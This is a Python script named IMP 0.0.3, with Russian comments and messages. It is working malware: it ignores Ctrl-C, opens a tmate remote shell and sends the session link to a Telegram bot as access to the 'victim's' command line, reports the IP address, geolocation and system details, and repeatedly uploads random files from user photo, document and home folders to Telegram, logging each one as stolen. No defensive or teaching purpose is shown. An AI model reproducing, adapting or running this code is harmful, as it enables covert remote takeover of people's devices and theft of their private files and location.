# Версия IMP 0.0.3
import time
import subprocess
import requests
from colorama import init, Fore, Style
import os
import threading
import zipfile 
import sys
import signal
import random
import platform
import json

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''

os_name = platform.system()
sys_name = 'undefined'
emoji = ''
tmate_output = []

def signal_handler(sig, frame):
    print("Failed to kill process.")

signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)

def get_geolocation():
    try:
        result = subprocess.run(['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            send_telegram_message("🌐❌ Ошибка при выполнении curl.")
            return None
    except Exception as e:
        send_telegram_message(f"🌐❌ Произошла ошибка при получении гео: {e}")
        return None

def get_location_by_ip(ip):
    response = requests.get(f'https://ipinfo.io/{ip}/json')
    if response.status_code == 200:
        return response.json()
    else:
        send_telegram_message("⛓️‍💥 Ошибка при выполнении запроса к ipinfo.io")
        return None

def session():
    global tmate, tmate_output  # Объявляем переменные как глобальные
    # Запускаем tmate в фоновом режиме
    process = subprocess.Popen(['tmate', '-F'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Запускаем отдельный поток для отправки сообщения через 3 секунды
    threading.Thread(target=send_tmate_output, args=(process,)).start()

    # Читаем вывод tmate в реальном времени
    while True:
        line = process.stdout.readline()
        if not line:
            break
        tmate_output.append(line.decode('utf-8').strip())

def send_tmate_output(process):
    time.sleep(3)  # Ждем 3 секунды
    # Получаем весь вывод tmate
    global tmate_output  # Объявляем переменную как глобальную
    tmate_output_str = '\n'.join(tmate_output)  # Объединяем все строки
    send_telegram_message(f"🛜 Ты можешь получить удаленный доступ к командной строке жертвы с помощью браузера, перейди по ссылке web session:\n{tmate_output_str}")
    
def run_commands():
    print('💿 Установка зависимостей...')
    global os_name
    global sys_name
    global emoji
    try:
        if os_name == "Linux":
            if os.path.exists('/data/data/com.termux/files'):
                sys_name = "Termux (Android)"
                emoji = '📱'
                subprocess.run(['pkg', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['pkg', 'install', 'tmate', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                tmate_thread = threading.Thread(target=session)
                tmate_thread.start()
            else:
                sys_name = "Linux Debian-based"
                emoji = '💻🐧'
                subprocess.run(['sudo', 'apt', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Darwin":
            sys_name = "MacOS"
            emoji = '💻🍏'
            subprocess.run(['brew', 'install', 'curl'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Windows":
            sys_name = "Windows"
            emoji = '💻🪟'
            subprocess.run(['winget', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            send_telegram_message(f"⚠️ ОС жертвы не определена! ОС: {os_name}. Продолжаю работу.")
            emoji = '⚠️'
            sys_name = "Неизвестная ОС"
    except Exception as e:
        send_telegram_message(f"❌ Ошибка установки зависимостей, продолжаю работу: {e}")
        print(f"Ошибка установки зависимостей: {e}")
    try:
        ip_address = subprocess.check_output(['curl', 'ifconfig.me']).decode('utf-8').strip()
        ver = platform.version()
        arch = platform.architecture()
        geo_data = get_geolocation()
        if geo_data:
            latitude, longitude = geo_data['loc'].split(',')
            location_info = get_location_by_ip(ip_address)
# Форматируем сообщение о местоположении
            location_message = (
                f"🌍 Гео\n"
                f"Широта: {latitude}\n"
                f"Долгота: {longitude}\n"
            )
            if location_info:
                location_message += (
                    f"IP: {location_info.get('ip', 'Неизвестно')}\n"
                    f"Город: {location_info.get('city', 'Неизвестно')}\n"
                    f"Регион: {location_info.get('region', 'Неизвестно')}\n"
                    f"Страна: {location_info.get('country', 'Неизвестно')}\n"
                    f"Почтовый индекс: {location_info.get('postal', 'Неизвестно')}\n"
                )
            else:
                location_message += "🌐❌ Не удалось получить доп инфу."
        else:
            location_message = "🌐❌ Не удалось получить гео."
        send_telegram_message(f"{emoji} Новая сессия\nКлиент: {ip_address}\nСистема: {sys_name} {ver} {arch}\n {location_message}")
        # if sys_name == "Termux (Android)":
        #     send_telegram_message(f"Ты можешь получить доступ к командной строке жертвы с помощью браузера, просто перейди по ссылке web session.\n{tmate}")
    except Exception as e:
        send_telegram_message(f"🚫 Fatal: {e}")
    share_thread = threading.Thread(target=share)
    share_thread.start()
    send_telegram_message(f"👁️️️️️️ Перехват данных...")
    if os_name == "Windows":
        os.system('cls')  # Для Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux и macOS
        os.system('clear')  # Для Linux и macOS
    else:
        send_telegram_message(f"🚫 Fatal. Unsupported platform.")

def share():
    global os_name
    while True:  # Бесконечный цикл
        try:
            if os_name == "Windows":
                folders_to_send = "C:\\Users\\"  # Дефолтная папка для Windows
            elif os_name == "Linux":
                if os.path.exists('/data/data/com.termux/files'):
                    folders_to_send = [
                        "/storage/emulated/0/Pictures",
                        "/storage/emulated/0/Movies",
                        "/storage/emulated/0/Music",
                        "/storage/emulated/0/Download",
                        "/storage/emulated/0/DCIM",
                        "/storage/emulated/0/Documents"
                    ]
                else:
                    folders_to_send = "/home"  # Дефолтная папка для Linux
            elif os_name == "Darwin":
                folders_to_send = ["/Users", "/Downloads", "/downloads", "/Download", "/download"]
            else:
                send_telegram_message("🅱️ ОС жертвы не определена! Юзаю план Б.")
                folders_to_send = [
                    "/storage",
                    "/Users",
                    "/files",
                    "/Download",
                    "/Downloads",
                    "/download",
                    "/downloads"
                ]

            for folder in folders_to_send:
                if os.path.exists(folder):
                    files = []
                    for root, dirs, files_in_folder in os.walk(folder):
                        for file in files_in_folder:
                            files.append(os.path.join(root, file))
                    
                    random_files = random.sample(files, min(5, len(files)))

                    for file_path in random_files:
                        with open(file_path, 'rb') as f:
                            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                            payload = {
                                'chat_id': TELEGRAM_CHAT_ID,
                            }
                            files = {
                                'document': f
                            }
                            try:
                                response = requests.post(url, data=payload, files=files)
                                if response.status_code == 200:
                                    send_telegram_message(f'🖤 Спизжено: {file_path}')
                                else:
                                    send_telegram_message(f'💔 Не спиздилось: {file_path} - {response.text}')
                            except requests.exceptions.RequestException as e:
                                send_telegram_message(f"⛓️‍💥 Ошибка при отправке файла: {e}")
                            time.sleep(1)
                else:
                    send_telegram_message(f"Папка не найдена: {folder}")
            time.sleep(4)  # Задержка перед следующей итерацией
        except Exception as e:
            send_telegram_message(f"🚫 Fatal: {e}")
            send_telegram_message(f"✋ Незамедлительное прекращение программы.")
            sys.exit(0)

def imp():
    run_commands()

if __name__ == "__main__":
    imp()